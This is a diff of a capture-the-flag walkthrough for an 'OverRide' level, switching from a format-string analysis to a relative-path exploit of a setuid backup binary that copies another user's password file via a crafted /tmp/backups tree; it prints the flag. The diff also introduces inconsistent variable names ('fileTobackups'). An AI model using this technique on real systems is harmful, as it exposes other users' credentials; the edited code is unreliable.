@@ -1,4 +1,4 @@
-# LEVEL 08 - FORMAT STRING 3 - NO ARG CHECK
+# LEVEL 08 - REVERSE 4 - RELATIVE PATH
 
 We have a binary named level08 at /home/users/level08/
 
@@ -12,7 +12,7 @@ Let's start with the `main` munction, the program first define two `FILE` stream
 int main(int argc, const char **argv)
 {
 	FILE *logFile;
-	FILE *fileToBackup;
+	FILE *fileTobackup;
 	int backupFd;
 	char buf;
 	char dest[104];
@@ -45,8 +45,8 @@ Next, the program tries to open the file to backup which is the filename passed 
 If no error was encountered the program proceeds to concatenate the filename with "./backups/" and tries to open this new file.
 
 ```c
-	fileToBackup = fopen(argv[1], "r");
-	if (!fileToBackup)
+	fileTobackup = fopen(argv[1], "r");
+	if (!fileTobackup)
 	{
 		printf("ERROR: Failed to open %s\n", argv[1]);
 		exit(1);
@@ -68,7 +68,7 @@ Finally, the file is copied character by character using the `buf` defined at th
 	buf = -1;
 	while (1)
 	{
-		buf = fgetc(fileToBackup);
+		buf = fgetc(fileTobackups);
 		if (buf == -1)
 			break;
 		write(backupFd, &buf, 1uLL);
@@ -76,7 +76,7 @@ Finally, the file is copied character by character using the `buf` defined at th
 
 	log_wrapper(logFile, "Finished back up ", argv[1]);
 
-	fclose(fileToBackup);
+	fclose(fileTobackup);
 	close(backupFd);
 	return 0;
 }
@@ -84,12 +84,7 @@ Finally, the file is copied character by character using the `buf` defined at th
 
 Next, let's break down the `log_wrapper` function
 
-This function is pretty straighforward, the arguments are in order:
-- The `FILE` stream of the log file `./backups/.log`
-- The debug message to write to the log file
-- The filename passed as argument of the program
-
-The function starts bu defining a buffer of 264 char and copies the debug message into it
+The function starts by defining a buffer of 264 char and copies the debug message into it
 
 ```c
 void log_wrapper(FILE *logFile, const char *msg, const char *filename)
@@ -114,37 +109,57 @@ Finally it finishes by writing the `dest` buffer into the log file using `fprint
 }
 ```
 
-We can see a format string vulnerability in this use of `snprintf`
+This program allow to backup files, it takes a single filename as arguments and copies it to a new file located at `./backups/`
 
-Following `snprintf`'s manual we can see it's arguments
+Let's execute it with the `.pass` file located at `/home/users/level09/level09` which contains the flag we need
 
-```c
-int snprintf(char *str, size_t size, const char *format, ...);
+```
+level08@OverRide:~$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
 ```
 
-The thirs argument is the format string but in this case the string is the argument passed as parameter to the program without parsing
+Because the directories `/home/users/level09/` are not present at the `./backups/` location, the program can't open the backup file
 
-```c
-//argv[1] passed without parsing from main function
-log_wrapper(logFile, "Starting back up: ", argv[1]);
+Let's try to create the missing directories
+
+```
+level08@OverRide:~$ cd ./backups/
+level08@OverRide:~/backups$ mkdir home
+mkdir: cannot create directory `home': Permission denied
 ```
 
-```c
-//filename is argv[1]
-void log_wrapper(FILE *logFile, const char *msg, const char *filename)
-```
+We have not the required permissions to create the missing directories
+
+The flaw in this binary resides into the usage of relative path when opening the backup file because the relative path is found using the actual pwd of the user executing the binary
 
 ```c
-//filename is passed as format string to snprintf without parsing
-snprintf(&dest[strlen(dest)], 254 - strlen(dest), filename);
+	strcpy(dest, "./backups/");
+	strncat(dest, argv[1], 99 - strlen(dest));
+	backupFd = open(dest, O_WRONLY | O_CREAT | O_EXCL, 00660);
 ```
 
-Now that we have found the vulnerability let's try to exploit it
+This means we can go to `/tmp/` and create `backups/` directory which will be used by the binary instead of the `/home/users/level08/backups/` directory
 
-We can start by using it to display the memory of the program
+We also need to create a `.log` file inside the `backups/` directory
 
+```
+level08@OverRide:~$ cd /tmp
+level08@OverRide:/tmp$ mkdir backups
+level08@OverRide:/tmp$ mkdir backups/home
+level08@OverRide:/tmp$ mkdir backups/home/users
+level08@OverRide:/tmp$ mkdir backups/home/users/level09
+level08@OverRide:/tmp$ touch backups/.log
+```
 
+Now let's execute the binary while being at `/tmp`
 
+```
+level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
 
-
-0x400ab3
+Here is the flag
+```
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
